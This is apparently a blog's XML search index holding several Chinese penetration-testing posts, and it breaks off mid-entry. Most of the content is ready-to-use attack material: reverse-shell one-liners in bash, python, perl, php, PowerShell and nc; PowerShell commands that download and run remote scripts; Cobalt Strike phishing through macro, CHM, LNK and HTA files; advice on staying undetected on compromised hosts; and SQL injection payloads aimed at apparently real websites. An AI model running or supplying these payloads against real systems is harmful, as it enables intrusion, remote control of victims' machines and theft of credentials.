<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[nc命令使用]]></title>
    <url>%2F2018%2F12%2F04%2Fnc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Netcat(nc):NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 Nc可以在两台设备上面相互交互，即侦听模式/传输模式 Telnet功能 获取banner信息 传输文本信息 传输文件/目录 加密传输文件，默认不加密 远程控制 加密所有流量 流媒体服务器 远程克隆硬盘 常用参数： -n 以数字形式表示的IP地址 -v 显示详细信息 [使用=vv获取更详细的信息 -l 监听入站信息 -p port 本地端口 -q secs 在标准输入且延迟后退出 -c shell commands shell模式 -u UDP模式 -s addr 本地源地址 -h 获取帮助信息 -z I/O 模式 [扫描时使用] 实例：正向连接A:nc -lp port -c bash B:nc ip port A将自己的Bash发给B 反向连接A:nc -lp port B:nc ip port -c bash B将自己的Bash发给A win下Bash换成cmd 通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell 使用NC进行信息收集简单的建立连接，就是侦听模式和传输模式 nc -lp port 监听指定端口号 nc -nv ip port 连接对方tcp端口，默认情况下，双方可以发送文本信息 收集目标机上的进程信息 nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地 Ps aux |nc -nv ip port -q 1 标准输入完成后delay一秒钟，会发送到侦听端 NC传输文件/目录 nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义 nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端 侦听端的文件名最好按照文件本身来命名 将目录打包： tar -cvf - 目录名/|nc -lp port -q 1 将目录解包 nc -nv ip port |tar -xvf - NC端口扫描 nc -nvz ip 1-65535 NC文件加密传输apt-get install mcrypt A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名 B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1 B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。主要是利用mcrypt进行加密 NC端口扫描nc -nvz ip 1-65535 默认使用tcp进行扫描 NC复制磁盘A:nc -lp port |dd of=/dev/sda B: dd if=/dev/sda | nc -nc ip port -q 1 If是input filter Of 是output filter B将数据复制到A挂载的硬盘上]]></content>
      <categories>
        <category>命令使用</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[常见的漏洞端口]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[21 ftp 主要看是否支持匿名，也可以跑弱口令 22 ssh SSH远程登录协议 23 telnet telnet终端仿真协议 80 web 常见web漏洞以及是否为一些管理后台 389 LDAP（轻量目录访问协议）存在匿名访问 443 openssl 心脏滴血以及一些web漏洞测试 873 rsync 主要看是否支持匿名，也可以跑弱口令 1099 JAVArmi 命令执行 1433 SQl server 1521 Oracle 弱口令 3306 MySQL 能够外联数据库 3389 RDP 远程桌面看看能不能弱口令 5432 PostGreSQL 弱口令爆破 6379 redis 一般无认证，可直接访问 7001，7002 weblogic的console口 8080 Tomcat\Jboss 弱口令，Jboss匿名访问 8080-8090 常见Web端口 9000 fast-cgi对外可以getshell 9043 WebSphere 弱口令爆破 27017 MongoDB 未授权访问]]></content>
  </entry>
  <entry>
    <title><![CDATA[反弹shell的几种姿势]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[powershell反弹shellpowercat反弹shell环境说明： 攻击机1：KALI 192.168.209.159 攻击机2：ubuntu 192.168.209.155 目标机：win7 192.168.209.160 可以在GitHub上下载powercat： https://github.com/besimorhino/powercat powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。 攻击机开启监听： nc -lvp 666 或者用powercat监听： powercat -l -p 666 目标机执行反弹cmd shell： powershell IEX (New-Object System.Net.Webclient).DownloadString (&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;); powercat -c 192.168.209.159 -p 6666 -e cmd nishang反弹shellNishang(https://github.com/samratashok/nishang )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。 Reverse TCP shell攻击机1（192.168.209.159）开启监听： nc -lvp 666 目标机执行： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666 或者将nishang下载到攻击者本地： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666 Reverse UDP shell攻击机1（192.168.209.159）开启监听： nc -lvup 123 目标机执行： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123 123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46 Reverse ICMP shell需要利用icmpsh_m.py (https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。 攻击机1下载icmpsh_m.py文件，并执行 python icmpsh_m.py [Attacker IP] [Victim IP] sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包 python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听 目标机执行： powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159 自定义powershell函数反弹shell利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1 攻击机1（192.168.209.159）开启监听： nc -lvp 2333 目标机执行： powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot; 或者保存为lltest_tcp.ps1文件 powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp lltest_tcp.ps1 如下： function Invoke-lltestTcp { $client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666) $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) $sendback = (iex $data 2&gt;&amp;1 | Out-String ) $sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) $stream.Write($sendbyte,0,$sendbyte.Length) $stream.Flush() } $client.Close() } dnscat2 反弹DNS shelldnscat2(https://github.com/iagox86/dnscat2)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell) 利用dnscat2 和 dnscat2-powershell实现反弹DNS shell: 攻击者2(Ubuntu 192.168.209.155)开启监听： ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open -e open 不使用加密连接，默认使用加密 ruby dnscat2.rb —help 查看帮助 目标机执行： powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155 成功反弹shell后，攻击机2： session -i 1 #进入到session 1 shell #执行之后会新生成一个session 需要通过session -i 2 切换 session -i 2 Empire 结合office反弹shellEmpire(https://github.com/EmpireProject/Empire) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell 利用office 宏反弹shell攻击者(192.168.209.159)开启监听: uselistener http execute back usestager windows/macro http #生成payload execute 生成/tmp/macro 攻击代码后，新建一个word 创建宏 点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(.doc)”或者“启用宏的Word 文档(.docm)”文档，当诱导目标打开，执行宏后，即可成功反弹shell： 说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏” PowerSploit DLL注入反弹shellPowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell msfvenom生成dll后门目标机1执行： msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll 目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp metasploit 设置payload 开启监听攻击机1执行： use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.209.159 set LPORT 4449 exploit 目标机远程下载powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程 目标执行： Get-Process #查看进程进程 IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll metasploit反弹shell利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell 攻击者1(192.168.209.159)： msfconsole use exploit/multi/script/web_delivery set PAYLOAD windows/meterpreter/reverse_tcp set target 2 set LHOST 192.168.209.159 set LPORT 123 exploit 执行完exploit后会弹出一段payload，将这段payload复制到目标机 目标机执行： powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring (&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;); Cobalt strike反弹shell博客中有一个专门的文章对Cobalt strike做介绍。 bash版本：bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意某些linux不支持 这里shell由bash解析，有时候是由sh解析，不一定百发百中 这里&amp;在Linux shell中表示后台运行，当然这里0&gt;&amp;1不是这样,对于&amp;1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO perl版本:perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos; python版本：python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; php版本：php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; ruby版本：ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; nc版本：nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 nc 10.0.0.1 1234 &gt;/tmp/f nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()]]></content>
      <categories>
        <category>shell</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[lcx使用:端口转发]]></title>
    <url>%2F2018%2F12%2F03%2Flcx%E4%BD%BF%E7%94%A8-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。 Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。 三个功能tran功能ran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台的某一个端口进行通信。 例如： 本机端口转向：lcx -tran 55 127.0.0.1 3389 转向其他主机端口：肉机运行： lcx.exe -slave 10.60.17.46 55 192.168.209.160 3389 操作机运行： lcx.exe -listen 55 3389 【原来的图片丢了….只能借用一下别人的了】 在被控制计算机上使用netstat -an查看当前所有的连接时，可以看到被控制计算机时在跟自己进行远程终端连接，而实际的3389端口是跟本机的55端口进行连接的。 注意： 如果被控制计算机是服务器，则在登陆时可以直接进行登陆;如果被控制计算机是Windows XP系统，则最好选择用户不在计算机的时间进行登陆，否则容易被发现。 不要轻易在被控制计算机上建立账号，尤其是Windows XP，建立帐号后，会立即在登陆界面中进行显示。]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike的使用]]></title>
    <url>%2F2018%2F12%2F03%2FCobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Cobalt Strike简介： Cobalt Strike是一款渗透测试软件，分为客户端与服务端，服务端是一个，客户端可以有多个，可以进行团队分布式操作 Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。 Cobalt Strike的安装Ubuntu 默认只有openjdk的源，但是cobalt strike建议使用oracle jdk需要需要先加入源。 apt-get install software-properties-common python-software-propertie add-apt-repository ppa:webupd8team/java apt-get update apt-get install oracle-Java8-installer 下载好Cobalt Strike工具然后解压缩。 进入Cobalt Strike文件内部开启服务 sudo ./teamserver 10.60.17.46 123456 后面这两个数是服务器IP（ubuntu的IP）和密码 配置客户端客户端需要安装java环境，平台并无特殊要求。 启动： Ubuntu:java-jar cobalt strike windows直接双击启动 host：服务器主机 port：50050 user：自定 password：服务器设置的 进入后首先配置监听器：点击上方Cobalt Strike选项——&gt;在下拉框中选择listeners——&gt;在下方弹出区域中单机add name：为监听器名字。 选择payload类型 host为shell反弹接受主机（服务端IP） port为反弹端口 其实,监听器的作用很简单,主要是为了接受payload回传的各类数据 比如,我们的payload在目标机器执行以后,会回连到监听器然后下载执行真正的shellcode代码,其实跟msf中handler的作用基本是一致的 beacon 为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs 该shell所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon shell的内置功能也非常多 foreign 主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器 生成payload：点击attacks——&gt;packages——&gt;windows executable listener为监听器名字 output为输出靶机类型。 点击generate弹出的对话框中选择保存位置和输入payload名字。 在windows靶机中双击payload生成文件（artifact.exe） 得到反弹shell 主机上线以后需要将默认刷新时间改成0，cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿。 修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定 右键弹出的内容下拉菜单中选择Interact，上线主机。 office钓鱼office钓鱼在无需交互、用户无感知的情况下，执行Office文档中内嵌的一段恶意代码，从远控地址中下载并运行恶意可执行程序，例如远控木马或者勒索病毒等。 Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office套件中，当用户启动office自动运行 具体操作：点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro 弹出界面选择Listener，单机确定 对话框中给出每一步仔细操作，单机copy macro按钮 word操作 点击上方标签视图标签 在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单机创建按钮 首先清空所有代码，然后将生成的代码复制到编辑器中，关闭宏编辑窗口 保存退出 双击再次运行保存的文档 当目标机器运行文档以后，Cobalt Strike会接受到目标机器反弹的shell 目标则会增加一个rundll32.exe的进程 CVE-2017-11882漏洞简介 漏洞为0ffice内存破坏漏洞，影响目前流行的所有0ffice版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。 漏洞影响： Microsoft Office 2007 Microsoft Office 2010 Microsoft Office 2013 Microsoft Office 2016 复现：下载https://github.com/Ridter/CVE-2017-11882python攻击脚本。 虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。 python Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; CHM钓鱼CHM介绍 CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。 利用CHM钓鱼主要原因是因为该文档可以执行cmd命令 这里制作CHM需要用到一个工具就是 EasyCHM CHM制作过程：创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。 先将下列代码复制到根文件夹中的index.html中。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt; &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; 打开我们的EasyCHM工具 后点击新建 然后导入自己创建的文件夹，点击确定后再点击编译，在弹出的对话框中点击生成CHM按钮 它会给你生产一个CHM文件，给别人发过去，一旦点击就会给弹出计算机 生成钓鱼文件启动Cobalt Strike，点击attacks——&gt;web Drive by——&gt;scripted web Delivery在弹出的对话框中将type类型设置为powershell然后单击launch按钮 再用代码将上面创建的根文件夹中的index.html代码中的calc.exe替换掉。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt; &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.209.151:81/aa&apos;))&quot;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; 生产CHM发送给别人，点击后获得反弹的shell LNK钓鱼 lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。 lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。 先做个简单的powershell生产图标：创建个txt文本写入下面代码然后改文件后缀名为.ps1。 cmd /c calc.exe 右键文件powershell运行后会弹出计算器 钓鱼方法：首先通过Cobalt Strike的attacks——&gt;web Drive by——&gt;scripted web Delivery tpye类型为powershell，然后单机launch。生产代码。 还记的上面做的那个简单的powershell么，后缀改回txt，将生成的代码替换掉calc.exe 将下面的powershell代码写入.ps1文件，右键运行powershell。 $file = Get-Content &quot;test.txt&quot; $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.Arguments = &apos; &apos;+ $file $Shortcut.Save() 生成test.lnk文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下） 后将test.lnk发送给他人，获得反弹shell。 HTA钓鱼 HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。 HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。 就是一个html应用程序，双击就能运行。 复现：Cobalt Strike，attacks——&gt;packages——&gt;HTML application 选择powershell然后单机generate，选择保存路径。 将生成的.hta文件发送给别人，点击后获得shell 网站克隆 Cobalt Strike还能够实现网站克隆 cotalt strike能够快速复制目标网站前端页面，并且复制相识度极高 cotalt strike同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器。 点击attacks——&gt;Web Drive-by——&gt;Clone site Clone URL：克隆目标网站的URL（如果网站不是80端口的话域名后得跟上端口号。） 注意问题：URL需要添加http协议和端口（80） Local URL：本地克隆路径 Local Host：本地主机IP Local Port：本地端口 Attack：克隆后目标网站执行脚本，如：flash漏洞 后渗透阶段相信你已经能拿到一个beacon的shell了。 下面是一些基本的使用命令，但是cs监听器对中文支持并不友好，会对中文产生乱码。 help 查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样,eg: help checkin note 给当前目录机器起个名字, eg: note beacon-shell cd 在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用&apos;/&apos; eg: cd c:\\ mkdir 新建目录, eg: mkdir d:\\beacon rm 删除文件或目录, eg: rm d:\\beacon upload 上传文件到目标系统中 download 从目标系统下载指定文件,eg: download C:\\Users\\win7cn\\Desktop\\putty.exe cancel 取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下 shell 在目标系统中执行指定的cmd命令, eg: shell whoami getuid 查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权 pwd 查看当前在目录系统中的路径 ls 列出当前目录下的所有文件和目录 drives 列表出目标系统的所有分区[win中叫盘符] ps 查看目标系统当前的所有的进程列表 kill 杀掉指定进程, eg: kill 4653 sleep 10 指定被控端休眠时间,默认60秒一次回传,让被控端每10秒来下载一次任务,实际中频率不宜过快,容易被发现,80左右一次即可 jobs 列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除 jobkill 如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, eg: jobkill 1345 clear 清除beacon内部的任务队列 checkin 强制让被控端回连一次 exit 终止当前beacon 会话 ctrl + k 清屏 有些可能会触发敏感api导致防护报警,另外进程注入,被控端可能感到非常明显的卡顿,工具也有许多不完善的地方]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL报错注入方法整理]]></title>
    <url>%2F2018%2F12%2F03%2FMySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[mysql暴错注入方法整理：通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法。 报错注入：（and后不能直接跟select，可以加（）） 1.报错注入floor—-&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 2.报错注入extractvalue—-&gt;select extractvalue(1,concat(0x5c,([payload]))) 3.报错注入updatexml—-&gt;select 1=(updatexml(1,concat(0x3a,([payload])),1)) 4.报错注入Exp—-&gt;select Exp(~(select * from ([payload])a)) 通过floor暴错(原理在底部)/数据库版本/http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select version()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+ /简单办法暴库/http://www.waitalone.cn/sql.php?id=info() /连接用户/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /连接数据库/http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+ /暴库/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴表/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴字段/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴内容/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) ExtractValue(有长度限制,最长32位)http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e)) http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) UpdateXml(有长度限制,最长32位)http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) NAME_CONST(适用于低版本)http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)-- Error based Double Query Injection(http://www.vaibs.in/error-based-double-query-injection/) /数据库版本/http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 floor报错详解floor----&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 Rand() //随机函数 Floor() //取整函数 Count() //聚合函数 Group by key //分组语句 当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[这个是Mysql的bug]。 0x3a ：的十六进制，在这里把他作为分隔符，没有它查出来的东西就连成一片。 group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP绕过md5]]></title>
    <url>%2F2018%2F12%2F03%2FPHP%E7%BB%95%E8%BF%87md5%2F</url>
